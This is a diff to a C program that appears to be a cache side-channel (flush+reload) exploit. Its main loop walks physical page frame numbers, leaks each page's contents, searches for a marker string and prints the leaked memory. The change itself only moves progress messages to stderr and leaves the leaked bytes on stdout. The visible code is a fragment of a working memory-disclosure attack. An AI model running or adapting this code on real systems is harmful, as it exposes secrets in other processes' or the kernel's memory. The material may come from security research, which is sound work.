@@ -3,7 +3,6 @@
 #include "flush_and_reload.h"
 #include "statistics.h"
 #include <bits/types/siginfo_t.h>
-#include <ctype.h>
 #include <signal.h>
 #include <stdint.h>
 #include <stdlib.h>
@@ -162,15 +161,15 @@ int main(int argc, char *argv[argc]) {
   uint8_t page[PAGE_SIZE] = {0};
 
   for (size_t p = 0; p < 0x1000000; ++p) {
-    printf("Looking at PFN %lx\r", p);
+    fprintf(stderr, "Looking at PFN %lx\r", p);
     leak_page(p, leak, *reload_buffer, page);
     char *ptr = memmem(page, PAGE_SIZE, needle, 8);
     if (ptr != NULL) {
-      printf("Found on PFN %lx:\n", p);
+      fprintf(stderr, "Found on PFN %lx:\n", p);
       for (int i = 0; i < PAGE_SIZE; ++i) {
         printf("%c", page[i]);
       }
-      printf("\n");
+      fprintf(stderr, "\n");
     }
   }
 
